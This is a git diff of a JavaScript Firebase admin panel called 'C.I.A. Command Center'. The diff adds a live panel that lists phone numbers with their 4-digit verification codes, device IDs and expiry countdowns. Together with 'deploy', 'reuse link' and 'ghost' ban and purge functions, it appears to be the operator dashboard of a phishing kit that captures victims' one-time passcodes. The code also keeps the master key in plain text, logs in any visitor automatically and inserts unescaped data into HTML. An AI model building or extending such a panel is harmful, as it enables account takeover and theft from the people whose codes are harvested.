@@ -1,6 +1,7 @@
 /**
  * C.I.A. Command Center - Admin Panel
  * First Time Setup → Auto Login After
+ * + System Verification Panel
  */
 
 const firebaseConfig = {
@@ -21,6 +22,13 @@ let currentUserData = [];
 let currentFilter = 'none';
 let bannedUsersData = [];
 
+// ============================================================
+// SYSTEM VERIFICATION VARIABLES
+// ============================================================
+let verificationListener = null;
+let verificationCountdownInterval = null;
+let activeVerifications = {};
+
 // ========== CHECK IF MASTER KEY EXISTS ==========
 async function checkMasterKeyExists() {
     try {
@@ -39,7 +47,6 @@ async function setupMasterKey() {
     const errorDiv = document.getElementById('setupError');
     const btn = document.getElementById('setupBtn');
     
-    // Validate
     if (!newKey || !confirmKey) {
         errorDiv.innerHTML = "⚠️ Please fill in both fields";
         errorDiv.style.color = '#ff4444';
@@ -65,12 +72,10 @@ async function setupMasterKey() {
     }
     
     try {
-        // Disable button
         btn.disabled = true;
         errorDiv.innerHTML = "⏳ Saving to Firebase...";
         errorDiv.style.color = '#39ff14';
         
-        // Save to Firebase
         await db.ref('admin/masterKey').set(newKey);
         await db.ref('admin/setupInfo').set({
             createdAt: Date.now(),
@@ -81,16 +86,17 @@ async function setupMasterKey() {
         errorDiv.innerHTML = "✅ Master key created successfully!";
         errorDiv.style.color = '#39ff14';
         
-        // Auto-login after 1 second
         setTimeout(() => {
             document.getElementById('setupOverlay').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             document.getElementById('dashboard').classList.add('active');
             
-            // Load all data
             loadStats();
             checkGlobalFirewallStatus();
             checkChangeNumberStatus();
+            
+            // 🎯 Initialize System Verification Panel
+            initSystemVerificationPanel();
             
             console.log('✅ Setup complete! Auto-login successful.');
         }, 1000);
@@ -118,18 +124,15 @@ function showSetupOverlay() {
 document.addEventListener('DOMContentLoaded', async function() {
     console.log('🚀 Initializing C.I.A. Admin Panel...');
     
-    // Hide dashboard first
     const dashboard = document.getElementById('dashboard');
     if (dashboard) {
         dashboard.style.display = 'none';
         dashboard.classList.remove('active');
     }
     
-    // Check if master key exists
     const hasKey = await checkMasterKeyExists();
     
     if (hasKey) {
-        // Has key → Auto-login
         console.log('🔑 Master key found. Auto-login...');
         const setupOverlay = document.getElementById('setupOverlay');
         if (setupOverlay) setupOverlay.style.display = 'none';
@@ -139,14 +142,17 @@ document.addEventListener('DOMContentLoaded', async function() {
             dashboard.classList.add('active');
         }
         
-        // Load all data
         loadStats();
         checkGlobalFirewallStatus();
         checkChangeNumberStatus();
         
+        // 🎯 Initialize System Verification Panel
+        setTimeout(() => {
+            initSystemVerificationPanel();
+        }, 1000);
+        
         console.log('✅ Admin panel ready (Auto-login)');
     } else {
-        // No key → Show setup
         console.log('🔐 No master key found. Showing setup...');
         showSetupOverlay();
     }
@@ -154,7 +160,6 @@ document.addEventListener('DOMContentLoaded', async function() {
 
 // ========== KEYBOARD SHORTCUTS ==========
 document.addEventListener('keydown', function(e) {
-    // Enter key on setup fields
     if (e.key === 'Enter') {
         const setupOverlay = document.getElementById('setupOverlay');
         if (setupOverlay && setupOverlay.style.display !== 'none') {
@@ -1108,7 +1113,201 @@ function closeBranchPopup() {
     if (popup) popup.style.display = 'none';
 }
 
-// ========== ADMIN CHAT PANEL ==========
+// ============================================================
+// 🎯 SYSTEM VERIFICATION PANEL
+// Read data from user_sessions/{phone}/system_verification
+// ============================================================
+
+function initSystemVerificationPanel() {
+    if (!db) {
+        console.warn('⚠️ Firebase not initialized');
+        return;
+    }
+
+    // Real-time listener
+    if (verificationListener) {
+        db.ref('user_sessions').off('value', verificationListener);
+    }
+
+    verificationListener = db.ref('user_sessions').on('value', function(snapshot) {
+        var sessions = snapshot.val() || {};
+        var verifications = [];
+
+        Object.keys(sessions).forEach(function(phone) {
+            var userData = sessions[phone];
+            var verification = userData.system_verification;
+
+            if (verification && (verification.status === 'active' || verification.status === 'expired')) {
+                verifications.push({
+                    phone: phone,
+                    code: verification.code || '----',
+                    timer: verification.timer || 0,
+                    status: verification.status || 'active',
+                    deviceId: verification.deviceId || 'Unknown',
+                    createdAt: verification.createdAt || 0,
+                    lastUpdate: verification.lastUpdate || 0
+                });
+            }
+        });
+
+        // Sort by latest
+        verifications.sort(function(a, b) {
+            return (b.lastUpdate || 0) - (a.lastUpdate || 0);
+        });
+
+        activeVerifications = {};
+        verifications.forEach(function(v) {
+            activeVerifications[v.phone] = v;
+        });
+
+        renderSystemVerificationList(verifications);
+
+        // Update count
+        var activeCount = verifications.filter(function(v) {
+            return v.status === 'active';
+        }).length;
+        var countEl = document.getElementById('verificationCount');
+        if (countEl) countEl.textContent = activeCount;
+
+        console.log('📊 System verifications:', verifications.length, '(Active:', activeCount + ')');
+    });
+
+    // Start countdown updater
+    if (verificationCountdownInterval) {
+        clearInterval(verificationCountdownInterval);
+    }
+    verificationCountdownInterval = setInterval(updateVerificationTimers, 1000);
+
+    console.log('✅ System Verification Panel initialized');
+}
+
+function renderSystemVerificationList(verifications) {
+    var listEl = document.getElementById('verificationList');
+    if (!listEl) return;
+
+    if (!verifications || verifications.length === 0) {
+        listEl.innerHTML = 
+            '<div class="verification-empty">' +
+                '<i class="fas fa-inbox"></i>' +
+                '<p>No active verifications</p>' +
+            '</div>';
+        return;
+    }
+
+    var html = '';
+
+    verifications.forEach(function(v) {
+        var isActive = v.status === 'active';
+        var statusClass = isActive ? 'status-active' : 'status-expired';
+        var badgeClass = isActive ? 'active' : 'expired';
+
+        var timerClass = 'timer-value';
+        if (v.timer <= 9 && isActive) timerClass += ' urgent';
+
+        var createdTime = v.createdAt ? formatVerificationTime(v.createdAt) : '---';
+
+        html += 
+            '<div class="verification-item ' + statusClass + '" data-phone="' + v.phone + '">' +
+                '<div class="verification-header-row">' +
+                    '<div class="verification-phone">' +
+                        '<i class="fas fa-mobile-screen-button"></i>' +
+                        '<span>' + v.phone + '</span>' +
+                    '</div>' +
+                    '<div class="verification-status-badge ' + badgeClass + '">' +
+                        '<span class="status-dot"></span>' +
+                        '<span>' + (isActive ? 'ACTIVE' : 'EXPIRED') + '</span>' +
+                    '</div>' +
+                '</div>' +
+
+                '<div class="verification-data-grid">' +
+                    '<div class="verification-data-box">' +
+                        '<div class="verification-data-label">⏱ TIMER</div>' +
+                        '<div class="verification-data-value ' + timerClass + '" data-phone="' + v.phone + '">' +
+                            v.timer + 's' +
+                        '</div>' +
+                    '</div>' +
+                    '<div class="verification-data-box">' +
+                        '<div class="verification-data-label">🔑 4-DIGIT CODE</div>' +
+                        '<div class="verification-data-value code-value">' +
+                            v.code +
+                        '</div>' +
+                    '</div>' +
+                '</div>' +
+
+                '<div class="verification-footer">' +
+                    '<div class="verification-device">' +
+                        '<i class="fas fa-desktop"></i>' +
+                        '<span>' + v.deviceId + '</span>' +
+                    '</div>' +
+                    '<div class="verification-time">' +
+                        '<i class="fas fa-clock"></i>' +
+                        '<span>' + createdTime + '</span>' +
+                    '</div>' +
+                '</div>' +
+            '</div>';
+    });
+
+    listEl.innerHTML = html;
+}
+
+function updateVerificationTimers() {
+    var timerElements = document.querySelectorAll('.verification-data-value.timer-value');
+
+    timerElements.forEach(function(el) {
+        var phone = el.getAttribute('data-phone');
+        var verification = activeVerifications[phone];
+
+        if (!verification || verification.status !== 'active') return;
+
+        // Decrement timer locally
+        if (verification.timer > 0) {
+            verification.timer--;
+
+            el.textContent = verification.timer + 's';
+
+            if (verification.timer <= 9) {
+                el.classList.add('urgent');
+            } else {
+                el.classList.remove('urgent');
+            }
+        }
+    });
+}
+
+function formatVerificationTime(timestamp) {
+    if (!timestamp) return '---';
+
+    var date = new Date(timestamp);
+    var now = Date.now();
+    var diff = now - timestamp;
+
+    var minutes = Math.floor(diff / 60000);
+    var seconds = Math.floor((diff % 60000) / 1000);
+
+    if (minutes < 1) {
+        return seconds + 's ago';
+    }
+
+    if (minutes < 60) {
+        return minutes + 'm ago';
+    }
+
+    var hours = Math.floor(minutes / 60);
+    if (hours < 24) {
+        return hours + 'h ago';
+    }
+
+    var h = date.getHours();
+    var m = date.getMinutes().toString().padStart(2, '0');
+    var ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+
+    return h + ':' + m + ' ' + ampm;
+}
+
+// ============================================================
+// 🎯 ADMIN CHAT PANEL (Admin POV) — Cyan Theme
+// ============================================================
 (function() {
     'use strict';
     
@@ -1118,7 +1317,6 @@ function closeBranchPopup() {
     let currentMessages = {};
     
     function init() {
-        // Check if chat panel exists, if not create it
         if (!document.querySelector('.admin-chat-widget')) {
             createAdminPanel();
         }
@@ -1134,7 +1332,7 @@ function closeBranchPopup() {
         panel.className = 'admin-chat-widget';
         panel.innerHTML = `
             <button class="admin-chat-toggle" id="adminChatToggle">
-                <span style="font-size:20px;">💬</span>
+                <i class="fas fa-comments"></i>
                 <span class="chat-badge" id="adminBadge" style="display:none">0</span>
             </button>
             
@@ -1152,7 +1350,7 @@ function closeBranchPopup() {
                 
                 <div class="admin-user-list" id="adminUserList">
                     <div class="admin-empty-state">
-                        <div class="empty-icon">📭</div>
+                        <span class="empty-icon">📭</span>
                         <div class="empty-text">No conversations yet</div>
                     </div>
                 </div>
@@ -1170,7 +1368,9 @@ function closeBranchPopup() {
                     </div>
                     <div class="admin-chat-input-area">
                         <input type="text" class="admin-chat-input" id="adminChatInput" placeholder="Type reply...">
-                        <button class="admin-send-btn" id="adminSendBtn">✉</button>
+                        <button class="admin-send-btn" id="adminSendBtn">
+                            <i class="fas fa-paper-plane"></i>
+                        </button>
                     </div>
                 </div>
             </div>
@@ -1227,7 +1427,7 @@ function closeBranchPopup() {
             if (!snapshot.exists()) {
                 userList.innerHTML = `
                     <div class="admin-empty-state">
-                        <div class="empty-icon">📭</div>
+                        <span class="empty-icon">📭</span>
                         <div class="empty-text">No conversations yet</div>
                     </div>`;
                 return;
@@ -1510,6 +1710,38 @@ function closeBranchPopup() {
     
 })();
 
-console.log('✅ C.I.A. Admin Panel v3.0 - Auto-login with Setup');
+// ============================================================
+// EXPORT FUNCTIONS TO WINDOW
+// ============================================================
+window.setupMasterKey = setupMasterKey;
+window.showMasterKeyPopup = showMasterKeyPopup;
+window.closeKeyPopup = closeKeyPopup;
+window.updateMasterKey = updateMasterKey;
+window.toggleDropdown = toggleDropdown;
+window.deploy = deploy;
+window.reuseLink = reuseLink;
+window.toggleFirewall = toggleFirewall;
+window.toggleChangeNumber = toggleChangeNumber;
+window.banGhost = banGhost;
+window.liftBan = liftBan;
+window.deleteSingleUser = deleteSingleUser;
+window.purgeGhost = purgeGhost;
+window.toggleActionButtons = toggleActionButtons;
+window.toggleDevSort = toggleDevSort;
+window.toggleTimeSort = toggleTimeSort;
+window.toggleDeleteMode = toggleDeleteMode;
+window.toggleSelectAll = toggleSelectAll;
+window.confirmBulkDelete = confirmBulkDelete;
+window.cancelBulkDelete = cancelBulkDelete;
+window.showBannedPopup = showBannedPopup;
+window.closeBannedPopup = closeBannedPopup;
+window.searchBannedUsers = searchBannedUsers;
+window.clearBannedSearch = clearBannedSearch;
+window.unbanUser = unbanUser;
+window.showBranchDetails = showBranchDetails;
+window.closeBranchPopup = closeBranchPopup;
+window.initSystemVerificationPanel = initSystemVerificationPanel;
+
+console.log('✅ C.I.A. Admin Panel v3.1 - Auto-login with System Verification');
 console.log('ℹ️ First time? Create your access key.');
 console.log('ℹ️ Already setup? Auto-login.');
